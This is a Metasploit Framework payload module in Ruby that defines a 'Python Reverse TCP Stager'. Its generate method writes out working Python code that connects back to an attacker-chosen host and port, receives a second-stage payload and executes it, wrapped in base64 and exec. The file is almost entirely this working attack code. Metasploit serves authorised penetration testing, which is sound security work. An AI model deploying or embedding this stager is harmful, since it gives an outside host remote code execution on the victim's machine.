##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Stager

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Python Reverse TCP Stager',
			'Description'   => 'Reverse Python connect back stager',
			'Author'        => 'Spencer McIntyre',
			'License'       => MSF_LICENSE,
			'Platform'      => 'python',
			'Arch'          => ARCH_PYTHON,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Stager'        => {'Payload' => ""}
			))
	end

	#
	# Constructs the payload
	#
	def generate
		cmd = ''
		# Set up the socket
		cmd += "import socket,struct\n"
		cmd += "s=socket.socket(2,1)\n" # socket.AF_INET = 2, socket.SOCK_STREAM = 1
		cmd += "s.connect(('#{ datastore['LHOST'] }',#{ datastore['LPORT'] }))\n"
		cmd += "l=struct.unpack('>I',s.recv(4))[0]\n"
		cmd += "d=s.recv(4096)\n"
		cmd += "while len(d)!=l:\n"
		cmd += "\td+=s.recv(4096)\n"
		cmd += "exec(d,{'s':s})\n"

		# Base64 encoding is required in order to handle Python's formatting requirements in the while loop
		cmd = "import base64; exec(base64.b64decode('#{Rex::Text.encode_base64(cmd)}'))"
		return cmd
	end

	def handle_intermediate_stage(conn, payload)
		conn.put([payload.length].pack("N"))
	end
end
